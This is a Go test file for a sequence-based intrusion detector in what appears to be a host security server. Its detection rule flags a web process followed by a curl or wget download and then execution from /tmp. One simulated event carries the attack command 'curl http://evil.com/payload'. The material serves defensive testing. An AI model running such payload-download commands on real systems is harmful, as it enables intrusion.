package celengine

import (
	"testing"

	"go.uber.org/zap"

	"github.com/matrixplusio/mxcwpp/internal/server/model"
)

// TestSequenceDetectorBasic 测试基础序列检测（无 Redis，纯内存）
func TestSequenceDetectorBasic(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	// 创建内存 CEL 引擎（空规则，仅用于编译序列步骤表达式）
	eng, err := NewInMemory(logger, nil)
	if err != nil {
		t.Fatalf("创建引擎失败: %v", err)
	}

	// 序列规则：Web 入侵 → 下载工具 → 执行
	seqRules := []model.SequenceRule{
		{
			ID:   1,
			Name: "web_intrusion_chain",
			Steps: model.SequenceSteps{
				{Name: "web_shell", Expression: `exe.contains("php") || exe.contains("java")`, Order: 0},
				{Name: "download", Expression: `exe.contains("curl") || exe.contains("wget")`, Order: 1},
				{Name: "execute", Expression: `exe.startsWith("/tmp/")`, Order: 2},
			},
			WindowSecs: 300,
			Severity:   "critical",
			Category:   "intrusion",
		},
	}

	det := NewSequenceDetector(eng, nil, nil, logger)
	loaded := det.SetRules(seqRules)
	if loaded != 1 {
		t.Fatalf("期望加载 1 条规则，实际 %d", loaded)
	}

	hostID := "host-seq"

	// Step 1: php 进程 — 序列开始
	matched := det.Evaluate(hostID, 3000, map[string]string{
		"agent_id": hostID,
		"exe":      "/usr/bin/php",
		"cmdline":  "php index.php",
		"pid":      "100",
	})
	if len(matched) != 0 {
		t.Error("第一步不应触发完整匹配")
	}

	// Step 2: curl 下载 — 序列推进（但无 Redis，状态丢失）
	// 无 Redis 时 getState 总返回 nil，所以序列无法推进到 step 2
	// 这验证了"无 Redis 降级为仅检测第一步"的行为
	matched2 := det.Evaluate(hostID, 3000, map[string]string{
		"agent_id": hostID,
		"exe":      "/usr/bin/curl",
		"cmdline":  "curl http://evil.com/payload",
		"pid":      "200",
	})
	if len(matched2) != 0 {
		t.Error("无 Redis 时不应有完整匹配")
	}
}

// TestSequencePrecompilation 测试步骤表达式预编译
func TestSequencePrecompilation(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	eng, err := NewInMemory(logger, nil)
	if err != nil {
		t.Fatalf("创建引擎失败: %v", err)
	}

	// 有效规则
	valid := []model.SequenceRule{
		{
			ID:   1,
			Name: "valid_rule",
			Steps: model.SequenceSteps{
				{Name: "step1", Expression: `exe != ""`, Order: 0},
				{Name: "step2", Expression: `cmdline.contains("test")`, Order: 1},
			},
			WindowSecs: 60,
			Severity:   "medium",
		},
	}

	det := NewSequenceDetector(eng, nil, nil, logger)
	loaded := det.SetRules(valid)
	if loaded != 1 {
		t.Errorf("期望加载 1 条规则，实际 %d", loaded)
	}

	// 无效规则（表达式语法错误）— 应被跳过
	invalid := []model.SequenceRule{
		{
			ID:   2,
			Name: "bad_rule",
			Steps: model.SequenceSteps{
				{Name: "step1", Expression: `exe ==`, Order: 0}, // 语法错误
			},
			WindowSecs: 60,
			Severity:   "high",
		},
	}

	loaded2 := det.SetRules(invalid)
	if loaded2 != 0 {
		t.Errorf("无效规则不应被加载，实际加载 %d", loaded2)
	}
}

// TestSequenceEmptySteps 测试空步骤规则
func TestSequenceEmptySteps(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	eng, err := NewInMemory(logger, nil)
	if err != nil {
		t.Fatalf("创建引擎失败: %v", err)
	}

	rules := []model.SequenceRule{
		{
			ID:         1,
			Name:       "empty_steps",
			Steps:      model.SequenceSteps{},
			WindowSecs: 60,
			Severity:   "low",
		},
	}

	det := NewSequenceDetector(eng, nil, nil, logger)
	loaded := det.SetRules(rules)
	if loaded != 0 {
		t.Errorf("空步骤规则不应被加载，实际加载 %d", loaded)
	}
}

// TestSequenceRuleCount 测试规则计数
func TestSequenceRuleCount(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	eng, err := NewInMemory(logger, nil)
	if err != nil {
		t.Fatalf("创建引擎失败: %v", err)
	}

	det := NewSequenceDetector(eng, nil, nil, logger)
	if det.RuleCount() != 0 {
		t.Errorf("初始规则数应为 0")
	}

	rules := []model.SequenceRule{
		{ID: 1, Name: "r1", Steps: model.SequenceSteps{{Name: "s1", Expression: `exe != ""`}}, WindowSecs: 60, Severity: "low"},
		{ID: 2, Name: "r2", Steps: model.SequenceSteps{{Name: "s1", Expression: `cmdline != ""`}}, WindowSecs: 60, Severity: "medium"},
	}
	det.SetRules(rules)
	if det.RuleCount() != 2 {
		t.Errorf("期望 2 条规则，实际 %d", det.RuleCount())
	}
}
